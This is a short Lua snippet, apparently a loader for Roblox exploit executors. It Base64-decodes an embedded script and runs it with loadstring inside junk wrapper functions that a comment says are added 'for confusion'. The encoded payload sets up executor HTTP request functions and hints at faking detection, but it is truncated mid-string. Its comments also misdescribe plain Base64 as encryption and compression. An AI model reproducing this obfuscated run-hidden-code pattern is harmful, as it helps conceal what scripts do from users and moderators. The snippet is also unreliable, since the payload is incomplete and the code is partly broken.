-- Encoded string helper (Base64)
local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
local function b64decode(data)
    local bytes = {}
    local decode_map = {}
    for i=1,#b64chars do decode_map[b64chars:sub(i,i)] = i-1 end
    local padding = 0
    if data:sub(-2) == '==' then padding = 2
    elseif data:sub(-1) == '=' then padding = 1 end
    data = data:gsub('=','')
    local result = {}
    for i=1,#data,4 do
        local n = (decode_map[data:sub(i,i)] or 0) * 2^18 + (decode_map[data:sub(i+1,i+1)] or 0) * 2^12 + (decode_map[data:sub(i+2,i+2)] or 0) * 2^6 + (decode_map[data:sub(i+3,i+3)] or 0)
        table.insert(result, string.char(math.floor(n/2^16)%256))
        if data:sub(i+2,i+2) ~= '' then table.insert(result, string.char(math.floor(n/2^8)%256)) end
        if data:sub(i+3,i+3) ~= '' then table.insert(result, string.char(n%256)) end
    end
    return table.concat(result)
end

-- Encrypted (Base64) and compressed script payload (example, you'd compress & encode your full code)
local payload_b64 = "bG9jYWwgV29ya3NwYWNlID0gZ2FtZTpnZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKQpsb2NhbCBQbGF5ZXJzID0gZ2FtZTpnZXRTZXJ2aWNlKCJQbGF5ZXJzIikKbG9jYWwgSHR0cFNlcnZpY2UgPSBnYW1lOkdldFNlcnZpY2UoIkh0dHBTZXJ2aWNlIikKbG9jYWwgVXNlcklucHV0U2VydmljZSA9IGdhbWU6R2V0U2VydmljZSgiVXNlcklucHV0U2VydmljZSIpCmxvY2FsIHJlcXVlc3QgPSBodHRwX3JlcXVlc3Qgb3IgcmVxdWVzdCBvciBzeW4gYW5kIHN5bi5yZXF1ZXN0IG9yIGh0dHAgYW5kIGh0dHByZXF1ZXN0IG9yIGZsdHV4dXMgYW5kIGZsdHV4dXMucmVxdWVzdApsb2NhbCBMb2NhbFBsYXllciA9IFBsYXllcnMuTG9jYWxQbGF5ZXIKCnBjbGwgPSBmdW5jdGlvbigpIGxvY2FsIGV4ZWN1dG9yID0gZnVuY3Rpb24oKQogICAgLy8gUmV0dXJuIGZha2UgZGV0ZWN0aW9uIGZvciB0ZXN0CiAgICBpZiBfRy5EZWx0cmlvdXNF
"

-- Decode & run payload
local script_source = b64decode(payload_b64)

-- Add junk self-calling function wrapper for confusion
(function(x) 
    (function() end)() -- no-op call
    (function() end)()
    local junk = function() end
    junk()
    return loadstring(x)()
end)(script_source)
